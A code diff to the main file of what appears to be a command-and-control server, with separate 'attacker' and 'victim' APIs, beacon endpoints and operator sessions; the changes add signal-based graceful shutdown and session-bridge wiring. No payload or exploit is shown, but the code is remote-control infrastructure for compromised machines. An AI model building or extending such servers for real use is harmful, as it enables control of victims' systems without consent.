@@ -2,23 +2,31 @@
 #include <cpppwn.hpp>
 #include <SQLiteCpp/SQLiteCpp.h>
 
+#include <atomic>
+#include <csignal>
 #include <cstdint>
+#include <fcntl.h>
 #include <iostream>
 #include <memory>
+#include <poll.h>
 #include <print>
 #include <thread>
+#include <unistd.h>
+#include <stdlib.h>
 
 #include <OperatorRepository.hpp>
 #include <VictimRepository.hpp>
 #include "HttpUtils.hpp"
-#include "Logger.hpp"
+#include "Util/SafeLogger.hpp"
 #include "SessionManager.hpp"
+#include "ServerContext.hpp"
 #include "Types.hpp"
 #include "Config.hpp"
 #include "VictimTemplateRepository.hpp"
 #include "OperatorAuthenticator.hpp"
 #include "VictimTemplateAuthenticator.hpp"
 #include "SessionConnectionAuthenticator.hpp"
+#include "Services/SessionBridgeService.hpp"
 
 #include <Endpoints.hpp>
 #include <BeaconEndpoint.hpp>
@@ -29,24 +37,112 @@ bool is_locally_run = false;
 std::unique_ptr<IOperatorAuthenticator> g_operator_authenticator;
 std::unique_ptr<IVictimTemplateAuthenticator> g_victim_template_authenticator;
 std::unique_ptr<SessionConnectionAuthenticator> g_session_authenticator;
+std::unique_ptr<SessionBridgeService> g_session_bridge_service;
 
-// function protos
+namespace {
+std::atomic<bool> g_running{true};
+std::unique_ptr<cpppwn::RESTServer> g_attacker_api;
+std::unique_ptr<cpppwn::RESTServer> g_victim_api;
+int g_shutdown_pipe[2] = {-1, -1};
+
+void shutdown_rest_servers() {
+    if (g_attacker_api) {
+        g_attacker_api->stop();
+    }
+    if (g_victim_api) {
+        g_victim_api->stop();
+    }
+}
+
+void handle_shutdown_signal(int) {
+    if (g_shutdown_pipe[1] >= 0) {
+        const char byte = 1;
+        (void)write(g_shutdown_pipe[1], &byte, 1);
+    }
+    g_running = false;
+}
+
+bool init_shutdown_pipe() {
+    if (pipe(g_shutdown_pipe) != 0) {
+        return false;
+    }
+    fcntl(g_shutdown_pipe[0], F_SETFL, O_NONBLOCK);
+    fcntl(g_shutdown_pipe[1], F_SETFL, O_NONBLOCK);
+    return true;
+}
+
+void close_shutdown_pipe() {
+    if (g_shutdown_pipe[0] >= 0) {
+        close(g_shutdown_pipe[0]);
+        g_shutdown_pipe[0] = -1;
+    }
+    if (g_shutdown_pipe[1] >= 0) {
+        close(g_shutdown_pipe[1]);
+        g_shutdown_pipe[1] = -1;
+    }
+}
+
+void wait_for_shutdown_signal() {
+    while (g_running.load(std::memory_order_relaxed)) {
+        pollfd pfd{};
+        pfd.fd = g_shutdown_pipe[0];
+        pfd.events = POLLIN;
+        const int ready = poll(&pfd, 1, 200);
+        if (!g_running.load(std::memory_order_relaxed)) {
+            break;
+        }
+        if (ready > 0 && (pfd.revents & POLLIN)) {
+            char buffer[16];
+            while (read(g_shutdown_pipe[0], buffer, sizeof(buffer)) > 0) {
+            }
+            break;
+        }
+    }
+}
+
+void detach_api_thread(std::thread& thread) noexcept {
+    if (thread.joinable()) {
+        thread.detach();
+    }
+}
+} // namespace
+
 void initial_setup();
 void start_attacker_api(int16_t port);
 void start_victim_api(int16_t port);
 
 int main(int argc, char* argv[]) {
+    if (!init_shutdown_pipe()) {
+        logger::error("Failed to initialize shutdown pipe");
+        return 1;
+    }
+
+    struct sigaction action{};
+    action.sa_handler = handle_shutdown_signal;
+    sigemptyset(&action.sa_mask);
+    action.sa_flags = 0;
+    sigaction(SIGINT, &action, nullptr);
+    sigaction(SIGTERM, &action, nullptr);
+
     g_operator_authenticator = std::make_unique<OperatorAuthenticator>(db_file);
     g_victim_template_authenticator = std::make_unique<VictimTemplateAuthenticator>(db_file);
     g_session_authenticator = std::make_unique<SessionConnectionAuthenticator>(
         *g_operator_authenticator,
         *g_victim_template_authenticator);
+    g_session_bridge_service = std::make_unique<SessionBridgeService>(SessionManager::instance());
+
     SessionManager::instance().set_session_authenticator(g_session_authenticator.get());
 
-    // Load / Initialize Cofnig
+    ServerContext context{
+        *g_operator_authenticator,
+        *g_victim_template_authenticator,
+        *g_session_authenticator,
+        *g_session_bridge_service};
+
+    (void)context;
+
     auto& config = Config::instance(db_file);
 
-    // Parse command line arguments
     for (int i = 1; i < argc; ++i) {
         if (std::string(argv[i]) == "--local") {
             is_locally_run = true;
@@ -58,14 +154,31 @@ int main(int argc, char* argv[]) {
         initial_setup();
     }
 
-    const int16_t attacker_port{ is_locally_run ? static_cast<int16_t>(1337) : config.get<int16_t>("attacker_api_port", 1337) } ;
+    const int16_t attacker_port{ is_locally_run ? static_cast<int16_t>(1337) : config.get<int16_t>("attacker_api_port", 1337) };
     const int16_t victim_port{ is_locally_run ? static_cast<int16_t>(3000) : config.get<int16_t>("victim_api_port", 3000) };
 
     logger::info("Staring Attacker API on Port: {}", attacker_port);
-    std::jthread attacker_api(start_attacker_api, attacker_port);
+    std::thread attacker_api_thread(start_attacker_api, attacker_port);
 
     logger::info("Staring Victim API on Port: {}", victim_port);
-    std::jthread(start_victim_api, victim_port);
+    std::thread victim_api_thread(start_victim_api, victim_port);
+
+    wait_for_shutdown_signal();
+    g_running = false;
+
+    logger::info("Server shutting down...");
+
+    SessionManager::instance().stop_all();
+    shutdown_rest_servers();
+
+    detach_api_thread(attacker_api_thread);
+    detach_api_thread(victim_api_thread);
+
+    g_attacker_api.reset();
+    g_victim_api.reset();
+
+    close_shutdown_pipe();
+    _exit(0);
 }
 
 //-------------------------------------------------
@@ -266,19 +379,18 @@ void start_attacker_api(int16_t port) {
         config.get<std::string>("attacker_key")
     };
 
-    RESTServer attacker_api(port, tls_conf);
+    g_attacker_api = std::make_unique<RESTServer>(port, tls_conf);
+    RESTServer& attacker_api = *g_attacker_api;
 
     if (not is_locally_run) {
         attacker_api.use_middleware(basic_auth_middleware);
     }
 
-    // basic auth test endpoint
     attacker_api.get("/auth", [](const HttpRequest& req) -> HttpResponse {
         (void) req;
         return HttpResponse().set_json(R"(true)");
     });
 
-    // Session endpoints
     attacker_api.get("/open_session", open_session_handler);
     attacker_api.get("/close_session", close_session_handler);
 
@@ -287,9 +399,6 @@ void start_attacker_api(int16_t port) {
     attacker_api.start();
 }
 
-//-------------------------------------------------
-//
-//-------------------------------------------------
 void start_victim_api(int16_t port) {
     using namespace cpppwn;
     auto& config = Config::instance(db_file);
@@ -299,7 +408,8 @@ void start_victim_api(int16_t port) {
         config.get<std::string>("victim_key")
     };
 
-    RESTServer victim_api(port, tls_conf);
+    g_victim_api = std::make_unique<RESTServer>(port, tls_conf);
+    RESTServer& victim_api = *g_victim_api;
 
     if (not is_locally_run) {
         victim_api.use_middleware(victim_auth_middleware);
